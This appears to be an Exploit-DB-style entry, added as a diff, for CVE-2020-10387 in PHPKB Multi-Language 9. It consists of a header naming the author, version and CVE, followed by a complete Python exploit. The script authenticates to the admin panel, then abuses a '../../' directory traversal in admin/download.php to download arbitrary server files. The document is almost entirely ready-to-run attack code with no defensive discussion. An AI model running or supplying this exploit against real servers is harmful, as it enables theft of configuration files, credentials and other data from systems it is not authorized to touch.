@@ -1,0 +1,34 @@
+# Exploit Title: PHPKB Multi-Language 9 - Authenticated Directory Traversal
+# Google Dork: N/A
+# Date: 2020-03-15
+# Exploit Author: Antonio Cannito
+# Vendor Homepage: https://www.knowledgebase-script.com/
+# Software Link: https://www.knowledgebase-script.com/pricing.php
+# Version: Multi-Language v9
+# Tested on: Windows 8.1 / PHP 7.4.3
+# CVE : CVE-2020-10387
+##########################
+
+
+#!/usr/bin/env python3
+import argparse
+import requests
+import shutil
+
+#Parsing arguments
+parser = argparse.ArgumentParser(description="Exploiting CVE-2020-10387 - Authenticated Arbitrary File Download in admin/download.php in Chadha PHPKB Standard Multi-Language 9")
+parser.add_argument("url", type=str, help="PHPKB's base path")
+parser.add_argument("username", type=str, help="Superuser username")
+parser.add_argument("password", type=str, help="Superuser password")
+parser.add_argument("file", type=str, help="The file you want to download (starting from PHPKB's base path)")
+args = parser.parse_args()
+
+session = requests.Session()
+#Perform login
+session.post(args.url + "/admin/login.php", data={'phpkb_username': args.username, 'phpkb_password': args.password, 'login': 'LOGIN'}).text
+#Sending exploit code and downloading the file
+url = args.url + "/admin/download.php?called=ajax&act=backup-lang&file=../../" + args.file
+ext = url.split("/")[-1]
+with open(ext, 'wb') as file:
+    shutil.copyfileobj(session.get(url, stream=True).raw, file)
+del session
